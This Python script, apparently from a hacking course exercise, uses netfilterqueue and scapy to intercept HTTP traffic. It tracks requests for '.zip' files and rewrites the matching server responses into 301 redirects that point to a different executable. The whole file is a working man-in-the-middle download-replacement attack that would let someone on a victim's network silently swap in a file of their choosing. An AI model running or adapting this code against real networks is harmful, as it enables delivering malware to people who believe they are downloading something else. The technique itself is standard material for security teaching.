#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy

ack_list = []


def set_load(packet, link):
    packet[scapy.Raw].load = link
    print(packet.show())
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            request = str(scapy_packet[scapy.Raw].load)
            # print(scapy_packet.show())
            # print(request)
            if ".zip" in request:
                print("[+] .exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            # print(scapy_packet.show())
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                print(scapy_packet.show())
                modified_packet = set_load(scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar600.exe\n\n')
                packet.set_payload(bytes(modified_packet))
                # print(scapy_packet.show())

        # print(scapy_packet.show())
    packet.accept()
    # packet.drop()


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
